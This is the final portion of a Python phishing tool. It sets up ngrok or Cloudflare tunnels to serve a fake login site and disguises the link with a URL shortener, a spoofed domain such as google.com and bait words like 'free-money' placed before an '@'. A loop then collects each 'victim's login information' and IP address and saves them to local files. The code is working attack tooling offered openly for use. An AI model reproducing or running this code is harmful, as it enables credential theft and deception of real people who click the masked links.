    ngroklink=popen("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[-0-9a-z]*\.ngrok.io'").read()
    if ngroklink.find("ngrok")!=-1:
        ngrokcheck=True
    else:
        ngrokcheck=False
    cflink=popen("cat $HOME/.cffolder/log.txt | grep -o 'https://[-0-9a-z]*\.trycloudflare.com'").read()
    if cflink.find("cloudflare")!=-1:
        cfcheck=True
    else:
        cfcheck=False
    while True:
        if ngrokcheck and cfcheck:
            url_manager(cflink, "1", "2")
            url_manager(ngroklink, "3", "4")
            cuask(cflink)
            break
        elif not ngrokcheck and cfcheck:
            url_manager(cflink, "1", "2")
            cuask(cflink)
            break
        elif not cfcheck and ngrokcheck:
            url_manager(ngroklink, "1", "2")
            cuask(ngroklink)
            break
        elif not (cfcheck and ngrokcheck):
            sprint("\n"+error+"Tunneling failed! Consider using your own tunneling service on port 8080!"+nc)
            waiter()
            break
        else:
            sprint("\n"+error+"Unknown error!")
            killer()
            exit()


# Optional function for ngrok url masking
def masking(url):
    website= "https://is.gd/create.php\?format\=simple\&url\="+url
    internet()
    main1= os.popen("curl -s "+website)
    main2=main1.read()
    if not main2.find("gd")!=-1:
        sprint(error+"Service not available")
        waiter()
    main= main2.replace("https://", "")
    domain= input("\n"+ask+"Enter a custom domain [e.g., google.com, yahoo.com] > ")
    if domain=="":
        sprint("\n"+error+"No domain!")
        bait= input("\n"+ask+"Enter bait words without spaces or hyphens [e.g., free-money, pubg-mod] > ")
        if (bait==""):
            sprint("\n"+error+"No bait word!")
            sprint("\n"+success+"Your url is > https://"+ main)
            waiter()
        if bait.find(" ")!=-1:
            sprint("\n"+error+"Space in bait word!")
            waiter()
        final= "https://"+bait+"@"+main
        sprint("\n"+success+"Your url is > "+ final)
        waiter()
    if (domain.find("http://")!=-1 or domain.find("https://")!=-1):
        bait= input("\n"+ask+"Enter bait words without spaces or hyphens [e.g., free-money, pubg-mod] > ")
        if (bait==""):
            sprint("\n"+error+"No bait word!")
            final= domain+"@"+main
            sprint("\n"+success+"Your url is > "+ final)
            waiter()
        if bait.find(" ")!=-1:
            sprint("\n"+error+"Space in bait word!")
            waiter()
        final= domain+"-"+bait+"@"+main
        sprint("\n"+success+"Your url is > "+ final)
        waiter()
    else:
        domain= "https://"+domain
        bait= input("\n"+ask+"Enter bait words without spaces or hyphens [e.g., free-money, pubg-mod] > ")
        if bait=="":
            sprint("\n"+error+"No bait word!")
            final= domain+"@"+main
            sprint("\n"+success+"Your url is > "+ final)
            waiter()
        if bait.find(" ")!=-1:
            sprint("\n"+error+"Space in bait word!")
            waiter()
        final= domain+"-"+bait+"@"+main
        sprint("\n"+success+"Your url is > "+ final)
        waiter()

# Output urls
def url_manager(url,num1,num2):
    """
    The function `url_manager` takes a URL, a number, and another number as input and prints the URLs
    with their corresponding numbers.
    
    :param url: The URL parameter is the website URL that you want to manage. It should be a string
    value
    :param num1: The parameter `num1` is used to represent the number associated with the first URL
    :param num2: The parameter `num2` is used to represent the number associated with the second URL. It
    is used in the output message to indicate the position of the URL
    """
    internet()
    sprint("\n"+success+"Your urls are given below: \n")
    print(info2+"URL "+num1+" > "+bblue+url)
    if os.path.isfile(root+"/.site/.info.txt"):
        with open(root+"/.site/.info.txt", "r") as inform:
            masked=inform.read()
            print(info2+"URL "+num2+" > "+bblue+masked.strip()+"@"+url.replace("https://",""))


# Last function capturing usernames
def waiter():
    """
    The `waiter` function waits for login information and the victim's IP address, and saves them in
    separate files.
    """
    system("rm -rf $HOME/.site/ip.txt")
    sprint("\n"+info+bblue+"Waiting for login info...."+cyan+"Press "+white+"Ctrl + C"+cyan+" to exit")
    try:
        while True:
            if os.path.isfile(root+"/.site/usernames.txt"):
                print("\n\n"+success+bgreen+"Victim's login information found!\n\007")
                with open(root+"/.site/usernames.txt","r") as ufile:
                    userdata=ufile.readlines()
                    j=0
                    o=len(userdata)
                    while j<o:
                        print(cyan+'['+purple+'x'+cyan+'] :: '+bblue+userdata[j],end="")
                        j+=1
                print("\n"+info+"Saved in usernames.txt")
                print("\n"+info+bblue+"Waiting for the next step...."+cyan+"Press "+white+"Ctrl + C"+cyan+" to exit")
                system("cat $HOME/.site/usernames.txt >> usernames.txt")
                os.remove(root+"/.site/usernames.txt")
            sleep(0.75)
            if os.path.isfile(root+"/.site/ip.txt"):
                os.system("clear")
                print(logo)
                print("\n\n"+success+bgreen+"The victim's IP has been identified!\n\007")
                with open(root+"/.site/ip.txt","r") as ipfile:
                    ipdata=ipfile.readlines()
                    h=0
                    p=len(ipdata)
                    while h<p:
                        print(cyan+'['+purple+'x'+cyan+'] :: '+bblue+ipdata[h], end="")
                        h+=1
                print("\n"+info+"Saved in ip.txt")
                print("\n"+info+bblue+"Waiting for the next step..."+cyan+"Press "+white+"Ctrl + C"+cyan+" to exit")
                system("cat $HOME/.site/ip.txt >> ip.txt")
                os.system("rm -rf $HOME/.site/ip.txt")
            sleep(0.75)
    except KeyboardInterrupt:
        pexit()

if __name__ == '__main__':
    try:
        os.system("stty -echoctl")
        update()
        main()
    except KeyboardInterrupt:
        pexit()
# "If this code has been useful to you, please consider giving the repository a star. Your stars are a source of motivation for me!"
